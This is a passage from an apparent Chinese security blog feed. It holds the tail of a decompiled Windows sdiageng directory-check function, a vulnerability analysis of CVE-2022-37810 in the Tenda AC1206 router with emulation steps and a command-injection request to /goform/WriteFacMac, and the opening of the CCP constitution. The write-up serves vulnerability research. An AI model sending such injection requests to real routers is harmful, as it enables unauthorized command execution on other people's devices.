<h3 id="sdiageng-SdpIsSubDirectory"><a href="#sdiageng-SdpIsSubDirectory" class="headerlink" title="sdiageng!SdpIsSubDirectory"></a>sdiageng!SdpIsSubDirectory</h3><pre class="line-numbers language-none"><code class="language-none">__int64 __fastcall SdpIsSubDirectory(const unsigned __int16 *aParentDir, const unsigned __int16 *aChildDir, int *aData)
{
  int *lData; // r14
  const unsigned __int16 *lChildDir; // r12
  wchar_t *sChildDir3; // rdi
  size_t iLenParentDir; // rsi
  unsigned __int64 iLenChildDir; // rbp
  __int64 itraceCode1; // r8
  signed int dwLastError1; // ebx
  signed int dwLastError4; // eax
  wchar_t *sParentDir2; // r15
  int dwLastError3; // er9
  __int64 itraceCode3; // r8
  signed int dwLastError5; // eax
  int dwLastError2; // er9
  __int64 itraceCode2; // r8
  __int64 iCharCounter1; // rdx
  wchar_t *sParentDir3; // rax
  __int64 iCharCounter2; // rdx
  wchar_t *sChildDir2; // rax
  wchar_t *sChildDir1; // [rsp+60h] [rbp+8h]
  wchar_t *sParentDir1; // [rsp+78h] [rbp+20h]

  lData = aData;
  sParentDir1 = 0i64;
  lChildDir = aChildDir;
  sChildDir1 = 0i64;
  sChildDir3 = 0i64;
  iLenParentDir = 0i64;
  iLenChildDir = 0i64;
  if ( !aParentDir )                            // Check arguments for errors
  {
    itraceCode1 = 1957i64;
DEBUG_TRACE1:
    dwLastError1 = -2147024809;
    SdpDebugTrace(1u, L"SdpIsSubDirectory", itraceCode1, -2147024809);
    return dwLastError1;
  }
  if ( !aChildDir )
  {
    itraceCode1 = 1958i64;
    goto DEBUG_TRACE1;
  }
  if ( !aData )
  {
    itraceCode1 = 1959i64;
    goto DEBUG_TRACE1;
  }
  dwLastError4 = SdpGetFullPath(aParentDir, &amp;sParentDir1, 0i64);// Get Full path for parent directory
  sParentDir2 = sParentDir1;
  dwLastError1 = dwLastError4;
  if ( dwLastError4 &gt;= 0 )
  {
    dwLastError5 = SdpGetFullPath(lChildDir, &amp;sChildDir1, 0i64);// Get Full path for child directory
    dwLastError1 = dwLastError5;
    if ( dwLastError5 &gt;= 0 )
    {
      if ( sParentDir2 )
      {
        iCharCounter1 = 260i64;
        sParentDir3 = sParentDir2;
        do                                      // Calculate length for parent directory
        {
          if ( !*sParentDir3 )
            break;
          ++sParentDir3;
          --iCharCounter1;
        }
        while ( iCharCounter1 );
        dwLastError1 = iCharCounter1 == 0 ? 0x80070057 : 0;
        if ( iCharCounter1 )
          iLenParentDir = 260 - iCharCounter1;
      }
      else
      {
        dwLastError1 = -2147024809;
      }
      if ( dwLastError1 &lt; 0 )
        iLenParentDir = 0i64;
      if ( dwLastError1 &gt;= 0 )
      {
        sChildDir3 = sChildDir1;
        if ( sChildDir1 )
        {
          iCharCounter2 = 260i64;
          sChildDir2 = sChildDir1;
          do                                    // Calculate length for child directory
          {
            if ( !*sChildDir2 )
              break;
            ++sChildDir2;
            --iCharCounter2;
          }
          while ( iCharCounter2 );
          dwLastError1 = iCharCounter2 == 0 ? 0x80070057 : 0;
          if ( iCharCounter2 )
            iLenChildDir = 260 - iCharCounter2;
        }
        else
        {
          dwLastError1 = -2147024809;
        }
        if ( dwLastError1 &lt; 0 )
          iLenChildDir = 0i64;
        if ( dwLastError1 &gt;= 0 )
        {                                       // 1) Len for child dir &gt; Len for parent dir
                                                // 2) _wcsnicmp: Child dir begins with parent dir. Parent dir: %tmp%\SDIAG_random-clsid
                                                // 3) Last char of parent dir is "\" or next char for child dir, 
                                                // further than parent dir length, is "\" and exist further chars after this.
          *lData = iLenChildDir &gt; iLenParentDir
                &amp;&amp; !_wcsnicmp(sParentDir2, sChildDir1, iLenParentDir)
                &amp;&amp; (sParentDir2[iLenParentDir - 1] == '\\'
                 || sChildDir3[iLenParentDir] == '\\' &amp;&amp; sChildDir3[iLenParentDir + 1]);
          goto CLEANUP;
        }
        dwLastError3 = dwLastError1;
        itraceCode3 = 1971i64;
        goto DEBUG_TRACE2;
      }
      dwLastError2 = dwLastError1;
      itraceCode2 = 1968i64;
    }
    else
    {
      dwLastError2 = dwLastError5;
      itraceCode2 = 1965i64;
    }
    SdpDebugTrace(1u, L"SdpIsSubDirectory", itraceCode2, dwLastError2);
    sChildDir3 = sChildDir1;
    goto CLEANUP;
  }
  dwLastError3 = dwLastError4;
  itraceCode3 = 1962i64;
DEBUG_TRACE2:
  SdpDebugTrace(1u, L"SdpIsSubDirectory", itraceCode3, dwLastError3);
CLEANUP:
  if ( sParentDir2 )
    operator delete(sParentDir2);
  if ( sChildDir3 )
    operator delete(sChildDir3);
  return dwLastError1;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>检查参数是否有错误。 获取父目录的完整路径。 获取子目录的完整路径。 计算父目录的字符串长度。 计算子目录的字符串长度。 检查子目录是否真的是父目录的子目录。</p>
<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><ul>
<li><a href="https://irsl.medium.com/the-trouble-with-microsofts-troubleshooters-6e32fc80b8bd">https://irsl.medium.com/the-trouble-with-microsofts-troubleshooters-6e32fc80b8bd</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/archive/blogs/mattbie/windows-troubleshooting-platform-meta-pack-example">https://docs.microsoft.com/zh-cn/archive/blogs/mattbie/windows-troubleshooting-platform-meta-pack-example</a></li>
</ul>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-37810 Tenda路由器命令注入分析</title>
    <url>/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Tenda AC1206(v15.03.06.23)存在formWriteFacMac命令注入漏洞，可以通过mac参数执行任意命令。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>US_AC1206V1.0RTL_V15.03.06.23_multi_TD01</p>
<h4 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h4><p>提取固件运行httpd可执行文件</p>
<pre class="line-numbers language-none"><code class="language-none">binwalk -Me US_AC1206V1.0RTL_V15.03.06.23_multi_TD01.bin <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="qemu执行"><a href="#qemu执行" class="headerlink" title="qemu执行"></a>qemu执行</h4><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121103057802.png"></p>
<p>mips小端</p>
<pre class="line-numbers language-none"><code class="language-none">cd _US_AC1206V1.0RTL_V15.03.06.23_multi_TD01.bin.extracted/squashfs-root/
cp $(which qemu-mipsel-static) ./
sudo ./qemu-mipsel-static -L ./ ./bin/httpd
sudo chroot ./ ./qemu-mipsel-static ./bin/httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121103628491.png"></p>
<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121104528268.png"></p>
<p>main函数中0x00433a68有对apmib_init的判断，patch掉，bnez改为beqz</p>
<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121111549227.png"></p>
<p>ConnectCfm也需要改掉</p>
<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121112030522.png"></p>
<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121161405750.png"></p>
<h4 id="添加网卡"><a href="#添加网卡" class="headerlink" title="添加网卡"></a>添加网卡</h4><pre class="line-numbers language-none"><code class="language-none">sudo brctl addbr br0 
sudo brctl addif br0 eth0
sudo ifconfig br0 up
sudo dhclient br0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121161943583.png"></p>
<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121162340458.png"></p>
<h4 id="formWriteFacMac"><a href="#formWriteFacMac" class="headerlink" title="formWriteFacMac"></a>formWriteFacMac</h4><p>漏洞点在http的formWriteFacMac函数，IDA定位关键函数fromWirteFacMac，控制了mac参数就能利用doSystemCmd实现命令注入。</p>
<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121162811780.png"></p>
<h4 id="doSystemCmd"><a href="#doSystemCmd" class="headerlink" title="doSystemCmd"></a>doSystemCmd</h4><p>doSystemCmd函数不在httpd中，在libcommon.so中</p>
<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121164709994.png"></p>
<p>交叉引用查看formWriteFacMac函数调用链</p>
<pre class="line-numbers language-none"><code class="language-none">main -&gt; initWebs -&gt; formDefineTenDa -&gt; websFormDefine('WriteFacMac',formWriteFacMac);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>formDefineTenDa包含路由器接口和对应的处理函数，通过websFormDefine注册后，WriteFacMac会和formWriteFacMac形成绑定，在goform下产生接口WriteFacMac调用formWriteFacMac</p>
<p>192.168.130.137/goform/WriteFacMac</p>
<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121174942212.png"></p>
<h4 id="initWebs"><a href="#initWebs" class="headerlink" title="initWebs"></a>initWebs</h4><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121170833769.png"></p>
<h4 id="formDefineTenDa"><a href="#formDefineTenDa" class="headerlink" title="formDefineTenDa"></a>formDefineTenDa</h4><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121165748345.png"></p>
<h4 id="websGetVar"><a href="#websGetVar" class="headerlink" title="websGetVar"></a>websGetVar</h4><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121172710514.png"></p>
<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121172721758.png"></p>
<p>判断wp中的mac参数是否存在，不存在返回默认值00:01:02:11:22:33，存在则返回对应值，没有做任何过滤，因此可以直接构造。</p>
<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>当wp判断mac参数是否存在时，返回值没有做任何过滤，因此可以直接构造。</p>
<pre class="line-numbers language-none"><code class="language-none">192.168.130.137/goform/WriteFacMac?mac=00:01:02:11:22:33 || ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121175540394.png"></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>中国共产党章程（中国共产党第二十次全国代表大会部分修改，2022年10月22日通过）</title>
    <url>/2024/10/01/%E4%B8%AD%E5%9B%BD%E5%85%B1%E4%BA%A7%E5%85%9A%E7%AB%A0%E7%A8%8B%EF%BC%88%E4%B8%AD%E5%9B%BD%E5%85%B1%E4%BA%A7%E5%85%9A%E7%AC%AC%E4%BA%8C%E5%8D%81%E6%AC%A1%E5%85%A8%E5%9B%BD%E4%BB%A3%E8%A1%A8%E5%A4%A7%E4%BC%9A%E9%83%A8%E5%88%86%E4%BF%AE%E6%94%B9%EF%BC%8C2022%E5%B9%B410%E6%9C%8822%E6%97%A5%E9%80%9A%E8%BF%87%EF%BC%89/</url>
    <content><![CDATA[<h2 id="总纲"><a href="#总纲" class="headerlink" title="总纲"></a>总纲</h2><p>  中国共产党是中国工人阶级的先锋队，同时是中国人民和中华民族的先锋队，是中国特色社会主义事业的领导核心，代表中国先进生产力的发展要求，代表中国先进文化的前进方向，代表中国最广大人民的根本利益。党的最高理想和最终目标是实现共产主义。</p>
<p>  中国共产党以马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想作为自己的行动指南。</p>
<p>  马克思列宁主义揭示了人类社会历史发展的规律，它的基本原理是正确的，具有强大的生命力。中国共产党人追求的共产主义最高理想，只有在社会主义社会充分发展和高度发达的基础上才能实现。社会主义制度的发展和完善是一个长期的历史过程。坚持马克思列宁主义的基本原理，走中国人民自愿选择的适合中国国情的道路，中国的社会主义事业必将取得最终的胜利。</p>
<p>  以毛泽东同志为主要代表的中国共产党人，把马克思列宁主义的基本原理同中国革命的具体实践结合起来，创立了毛泽东思想。毛泽东思想是马克思列宁主义在中国的运用和发展，是被实践证明了的关于中国革命和建设的正确的理论原则和经验总结，是中国共产党集体智慧的结晶。在毛泽东思想指引下，中国共产党领导全国各族人民，经过长期的反对帝国主义、封建主义、官僚资本主义的革命斗争，取得了新民主主义革命的胜利，建立了人民民主专政的中华人民共和国；新中国成立以后，顺利地进行了社会主义改造，完成了从新民主主义到社会主义的过渡，确立了社会主义基本制度，发展了社会主义的经济、政治和文化。</p>
<p>  十一届三中全会以来，以邓小平同志为主要代表的中国共产党人，总结新中国成立以来正反两方面的经验，解放思想，实事求是，实现全党工作中心向经济建设的转移，实行改革开放，开辟了社会主义事业发展的新时期，逐步形成了建设中国特色社会主义的路线、方针、政策，阐明了在中国建设社会主义、巩固和发展社会主义的基本问题，创立了邓小平理论。邓小平理论是马克思列宁主义的基本原理同当代中国实践和时代特征相结合的产物，是毛泽东思想在新的历史条件下的继承和发展，是马克思主义在中国发展的新阶段，是当代中国的马克思主义，是中国共产党集体智慧的结晶，引导着我国社会主义现代化事业不断前进。</p>
<p>  十三届四中全会以来，以江泽民同志为主要代表的中国共产党人，在建设中国特色社会主义的实践中，加深了对什么是社会主义、怎样建设社会主义和建设什么样的党、怎样建设党的认识，积累了治党治国新的宝贵经验，形成了“三个代表”重要思想。“三个代表”重要思想是对马克思列宁主义、毛泽东思想、邓小平理论的继承和发展，反映了当代世界和中国的发展变化对党和国家工作的新要求，是加强和改进党的建设、推进我国社会主义自我完善和发展的强大理论武器，是中国共产党集体智慧的结晶，是党必须长期坚持的指导思想。始终做到“三个代表”，是我们党的立党之本、执政之基、力量之源。</p>
<p>  十六大以来，以胡锦涛同志为主要代表的中国共产党人，坚持以邓小平理论和“三个代表”重要思想为指导，根据新的发展要求，深刻认识和回答了新形势下实现什么样的发展、怎样发展等重大问题，形成了以人为本、全面协调可持续发展的科学发展观。科学发展观是同马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想既一脉相承又与时俱进的科学理论，是马克思主义关于发展的世界观和方法论的集中体现，是马克思主义中国化重大成果，是中国共产党集体智慧的结晶，是发展中国特色社会主义必须长期坚持的指导思想。</p>
<p>  十八大以来，以习近平同志为主要代表的中国共产党人，坚持把马克思主义基本原理同中国具体实际相结合、同中华优秀传统文化相结合，科学回答了新时代坚持和发展什么样的中国特色社会主义、怎样坚持和发展中国特色社会主义等重大时代课题，创立了习近平新时代中国特色社会主义思想。习近平新时代中国特色社会主义思想是对马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观的继承和发展，是当代中国马克思主义、二十一世纪马克思主义，是中华文化和中国精神的时代精华，是党和人民实践经验和集体智慧的结晶，是中国特色社会主义理论体系的重要组成部分，是全党全国人民为实现中华民族伟大复兴而奋斗的行动指南，必须长期坚持并不断发展。在习近平新时代中国特色社会主义思想指导下，中国共产党领导全国各族人民，统揽伟大斗争、伟大工程、伟大事业、伟大梦想，推动中国特色社会主义进入了新时代，实现第一个百年奋斗目标，开启了实现第二个百年奋斗目标新征程。</p>
<p>  改革开放以来我们取得一切成绩和进步的根本原因，归结起来就是：开辟了中国特色社会主义道路，形成了中国特色社会主义理论体系，确立了中国特色社会主义制度，发展了中国特色社会主义文化。全党同志要倍加珍惜、长期坚持和不断发展党历经艰辛开创的这条道路、这个理论体系、这个制度、这个文化，高举中国特色社会主义伟大旗帜，坚定道路自信、理论自信、制度自信、文化自信，发扬斗争精神，增强斗争本领，贯彻党的基本理论、基本路线、基本方略，为实现推进现代化建设、完成祖国统一、维护世界和平与促进共同发展这三大历史任务，实现第二个百年奋斗目标、实现中华民族伟大复兴的中国梦而奋斗。</p>
<p>  中国共产党自成立以来，始终把为中国人民谋幸福、为中华民族谋复兴作为自己的初心使命，历经百年奋斗，从根本上改变了中国人民的前途命运，开辟了实现中华民族伟大复兴的正确道路，展示了马克思主义的强大生命力，深刻影响了世界历史进程，锻造了走在时代前列的中国共产党。经过长期实践，积累了坚持党的领导、坚持人民至上、坚持理论创新、坚持独立自主、坚持中国道路、坚持胸怀天下、坚持开拓创新、坚持敢于斗争、坚持统一战线、坚持自我革命的宝贵历史经验，这是党和人民共同创造的精神财富，必须倍加珍惜、长期坚持，并在实践中不断丰富和发展。</p>
<p>  我国正处于并将长期处于社会主义初级阶段。这是在原本经济文化落后的中国建设社会主义现代化不可逾越的历史阶段，需要上百年的时间。我国的社会主义建设，必须从我国的国情出发，走中国特色社会主义道路，以中国式现代化全面推进中华民族伟大复兴。在现阶段，我国社会的主要矛盾是人民日益增长的美好生活需要和不平衡不充分的发展之间的矛盾。由于国内的因素和国际的影响，阶级斗争还在一定范围内长期存在，在某种条件下还有可能激化，但已经不是主要矛盾。我国社会主义建设的根本任务，是进一步解放生产力，发展生产力，逐步实现社会主义现代化，并且为此而改革生产关系和上层建筑中不适应生产力发展的方面和环节。必须坚持和完善公有制为主体、多种所有制经济共同发展，按劳分配为主体、多种分配方式并存，社会主义市场经济体制等基本经济制度，鼓励一部分地区和一部分人先富起来，逐步实现全体人民共同富裕，在生产发展和社会财富增长的基础上不断满足人民日益增长的美好生活需要，促进人的全面发展。发展是我们党执政兴国的第一要务。必须坚持以人民为中心的发展思想，把握新发展阶段，贯彻创新、协调、绿色、开放、共享的新发展理念，加快构建以国内大循环为主体、国内国际双循环相互促进的新发展格局，推动高质量发展。各项工作都要把有利于发展社会主义社会的生产力，有利于增强社会主义国家的综合国力，有利于提高人民的生活水平，作为总的出发点和检验标准，尊重劳动、尊重知识、尊重人才、尊重创造，做到发展为了人民、发展依靠人民、发展成果由人民共享。必须按照中国特色社会主义事业“五位一体”总体布局和“四个全面”战略布局，统筹推进经济建设、政治建设、文化建设、社会建设、生态文明建设，协调推进全面建设社会主义现代化国家、全面深化改革、全面依法治国、全面从严治党。新时代新征程，经济和社会发展的战略目标是，到二〇三五年基本实现社会主义现代化，到本世纪中叶把我国建成社会主义现代化强国。</p>
<p>  中国共产党在社会主义初级阶段的基本路线是：领导和团结全国各族人民，以经济建设为中心，坚持四项基本原则，坚持改革开放，自力更生，艰苦创业，为把我国建设成为富强民主文明和谐美丽的社会主义现代化强国而奋斗。</p>
<p>  中国共产党在领导社会主义事业中，必须坚持以经济建设为中心，其他各项工作都服从和服务于这个中心。要实施科教兴国战略、人才强国战略、创新驱动发展战略、乡村振兴战略、区域协调发展战略、可持续发展战略、军民融合发展战略，充分发挥科学技术作为第一生产力的作用，充分发挥人才作为第一资源的作用，充分发挥创新作为引领发展第一动力的作用，依靠科技进步，提高劳动者素质，促进国民经济更高质量、更有效率、更加公平、更可持续、更为安全发展。</p>
<p>  坚持社会主义道路、坚持人民民主专政、坚持中国共产党的领导、坚持马克思列宁主义毛泽东思想这四项基本原则，是我们的立国之本。在社会主义现代化建设的整个过程中，必须坚持四项基本原则，反对资产阶级自由化。</p>
<p>  坚持改革开放，是我们的强国之路。只有改革开放，才能发展中国、发展社会主义、发展马克思主义。要全面深化改革，完善和发展中国特色社会主义制度，推进国家治理体系和治理能力现代化。要从根本上改革束缚生产力发展的经济体制，坚持和完善社会主义市场经济体制；与此相适应，要进行政治体制改革和其他领域的改革。要坚持对外开放的基本国策，吸收和借鉴人类社会创造的一切文明成果。改革开放应当大胆探索，勇于开拓，提高改革决策的科学性，更加注重改革的系统性、整体性、协同性，在实践中开创新路。</p>
<p>  中国共产党领导人民发展社会主义市场经济。毫不动摇地巩固和发展公有制经济，毫不动摇地鼓励、支持、引导非公有制经济发展。发挥市场在资源配置中的决定性作用，更好发挥政府作用，建立完善的宏观调控体系。统筹城乡发展、区域发展、经济社会发展、人与自然和谐发展、国内发展和对外开放，调整经济结构，转变经济发展方式，推进供给侧结构性改革。促进新型工业化、信息化、城镇化、农业现代化同步发展，建设社会主义新农村，走中国特色新型工业化道路，建设创新型国家和世界科技强国。</p>
<p>  中国共产党领导人民发展社会主义民主政治。坚持党的领导、人民当家作主、依法治国有机统一，走中国特色社会主义政治发展道路、中国特色社会主义法治道路，扩大社会主义民主，建设中国特色社会主义法治体系，建设社会主义法治国家，巩固人民民主专政，建设社会主义政治文明。坚持和完善人民代表大会制度、中国共产党领导的多党合作和政治协商制度、民族区域自治制度以及基层群众自治制度。发展更加广泛、更加充分、更加健全的全过程人民民主，推进协商民主广泛多层制度化发展，切实保障人民管理国家事务和社会事务、管理经济和文化事业的权利。尊重和保障人权。广开言路，建立健全民主选举、民主协商、民主决策、民主管理、民主监督的制度和程序。完善中国特色社会主义法律体系，加强法律实施工作，实现国家各项工作法治化。</p>
<p>  中国共产党领导人民发展社会主义先进文化。建设社会主义精神文明，实行依法治国和以德治国相结合，提高全民族的思想道德素质和科学文化素质，为改革开放和社会主义现代化建设提供强大的思想保证、精神动力和智力支持，建设社会主义文化强国。加强社会主义核心价值体系建设，坚持马克思主义指导思想，树立中国特色社会主义共同理想，弘扬以爱国主义为核心的民族精神和以改革创新为核心的时代精神，培育和践行社会主义核心价值观，倡导社会主义荣辱观，增强民族自尊、自信和自强精神，抵御资本主义和封建主义腐朽思想的侵蚀，扫除各种社会丑恶现象，努力使我国人民成为有理想、有道德、有文化、有纪律的人民。对党员要进行共产主义远大理想教育。大力发展教育、科学、文化事业，推动中华优秀传统文化创造性转化、创新性发展，继承革命文化，发展社会主义先进文化，提高国家文化软实力。牢牢掌握意识形态工作领导权，不断巩固马克思主义在意识形态领域的指导地位，巩固全党全国人民团结奋斗的共同思想基础。</p>
<p>  中国共产党领导人民构建社会主义和谐社会。按照民主法治、公平正义、诚信友爱、充满活力、安定有序、人与自然和谐相处的总要求和共同建设、共同享有的原则，以保障和改善民生为重点，解决好人民最关心、最直接、最现实的利益问题，使发展成果更多更公平惠及全体人民，不断增强人民群众获得感，努力形成全体人民各尽其能、各得其所而又和谐相处的局面。加强和创新社会治理。严格区分和正确处理敌我矛盾和人民内部矛盾这两类不同性质的矛盾。加强社会治安综合治理，依法坚决打击各种危害国家安全和利益、危害社会稳定和经济发展的犯罪活动和犯罪分子，保持社会长期稳定。坚持总体国家安全观，统筹发展和安全，坚决维护国家主权、安全、发展利益。</p>
<p>  中国共产党领导人民建设社会主义生态文明。树立尊重自然、顺应自然、保护自然的生态文明理念，增强绿水青山就是金山银山的意识，坚持节约资源和保护环境的基本国策，坚持节约优先、保护优先、自然恢复为主的方针，坚持生产发展、生活富裕、生态良好的文明发展道路。着力建设资源节约型、环境友好型社会，实行最严格的生态环境保护制度，形成节约资源和保护环境的空间格局、产业结构、生产方式、生活方式，为人民创造良好生产生活环境，实现中华民族永续发展。</p>
<p>  中国共产党坚持对人民解放军和其他人民武装力量的绝对领导，贯彻习近平强军思想，加强人民解放军的建设，坚持政治建军、改革强军、科技强军、人才强军、依法治军，建设一支听党指挥、能打胜仗、作风优良的人民军队，把人民军队建设成为世界一流军队，切实保证人民解放军有效履行新时代军队使命任务，充分发挥人民解放军在巩固国防、保卫祖国和参加社会主义现代化建设中的作用。</p>
<p>  中国共产党维护和发展平等团结互助和谐的社会主义民族关系，积极培养、选拔少数民族干部，帮助少数民族和民族地区发展经济、文化和社会事业，铸牢中华民族共同体意识，实现各民族共同团结奋斗、共同繁荣发展。全面贯彻党的宗教工作基本方针，团结信教群众为经济社会发展作贡献。</p>
<p>  中国共产党同全国各民族工人、农民、知识分子团结在一起，同各民主党派、无党派人士、各民族的爱国力量团结在一起，进一步发展和壮大由全体社会主义劳动者、社会主义事业的建设者、拥护社会主义的爱国者、拥护祖国统一和致力于中华民族伟大复兴的爱国者组成的最广泛的爱国统一战线。不断加强全国人民包括香港特别行政区同胞、澳门特别行政区同胞、台湾同胞和海外侨胞的团结。全面准确、坚定不移贯彻“一个国家、两种制度”的方针，促进香港、澳门长期繁荣稳定，坚决反对和遏制“台独”，完成祖国统一大业。</p>
<p>  中国共产党坚持独立自主的和平外交政策，坚持和平发展道路，坚持互利共赢的开放战略，统筹国内国际两个大局，积极发展对外关系，努力为我国的改革开放和现代化建设争取有利的国际环境。在国际事务中，弘扬和平、发展、公平、正义、民主、自由的全人类共同价值，坚持正确义利观，维护我国的独立和主权，反对霸权主义和强权政治，维护世界和平，促进人类进步，推动构建人类命运共同体，推动建设持久和平、普遍安全、共同繁荣、开放包容、清洁美丽的世界。在互相尊重主权和领土完整、互不侵犯、互不干涉内政、平等互利、和平共处五项原则的基础上，发展我国同世界各国的关系。不断发展我国同周边国家的睦邻友好关系，加强同发展中国家的团结与合作。遵循共商共建共享原则，推进“一带一路”建设。按照独立自主、完全平等、互相尊重、互不干涉内部事务的原则，发展我党同各国共产党和其他政党的关系。</p>
<p>  中国共产党要领导全国各族人民实现第二个百年奋斗目标、实现中华民族伟大复兴的中国梦，必须紧密围绕党的基本路线，坚持和加强党的全面领导，坚持党要管党、全面从严治党，弘扬坚持真理、坚守理想，践行初心、担当使命，不怕牺牲、英勇斗争，对党忠诚、不负人民的伟大建党精神，加强党的长期执政能力建设、先进性和纯洁性建设，以改革创新精神全面推进党的建设新的伟大工程，以党的政治建设为统领，全面推进党的政治建设、思想建设、组织建设、作风建设、纪律建设，把制度建设贯穿其中，深入推进反腐败斗争，全面提高党的建设科学化水平，以伟大自我革命引领伟大社会革命。坚持立党为公、执政为民，发扬党的优良传统和作风，不断提高党的领导水平和执政水平，提高拒腐防变和抵御风险的能力，不断增强自我净化、自我完善、自我革新、自我提高能力，不断增强党的阶级基础和扩大党的群众基础，不断提高党的创造力、凝聚力、战斗力，建设学习型、服务型、创新型的马克思主义执政党，使我们党始终走在时代前列，成为领导全国人民沿着中国特色社会主义道路不断前进的坚强核心。党的建设必须坚决实现以下六项基本要求：</p>
